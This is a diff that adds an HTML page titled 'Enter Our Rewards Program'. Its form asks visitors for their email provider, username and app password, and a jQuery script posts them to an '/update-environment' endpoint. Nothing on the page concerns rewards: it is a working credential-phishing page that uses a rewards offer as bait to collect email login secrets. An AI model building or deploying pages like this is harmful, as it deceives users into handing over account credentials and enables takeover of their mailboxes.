@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Enter Our Rewards Program</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+  <h1>Enter Our Rewards Program!</h1>
+  <form id="userInputForm">
+    <label for="provider">Email Provider:</label>
+    <input type="text" id="provider" name="provider" required><br><br>
+    
+    <label for="username">Username:</label>
+    <input type="username" id="username" name="username" required><br><br>
+    
+    <label for="password">Password:</label>
+    <input type="app password" id="password" name="password" required><br><br>
+    
+    <button type="submit">Submit</button>
+  </form>
+
+  <script>
+    $(document).ready(function() {
+      $("#userInputForm").submit(function(event) {
+        //event.preventDefault(); 
+
+        const provider = $("#provider").val();
+        const username = $("#username").val();
+        const password = $("#password").val();
+
+        const userInput = {
+          provider: provider,
+          username: username,
+          password: password
+        };
+
+        $.ajax({
+          url: "/update-environment",
+          type: "POST",
+          data: JSON.stringify(userInput),
+          contentType: "application/json",
+          success: function(response) {
+            console.log(response);
+            // Handle server response here
+          },
+          error: function(error) {
+            console.error(error);
+            // Handle error here
+          }
+        });
+
+        $("#userInputForm")[0].reset();
+      });
+    });
+  </script>
+</body>
+</html>
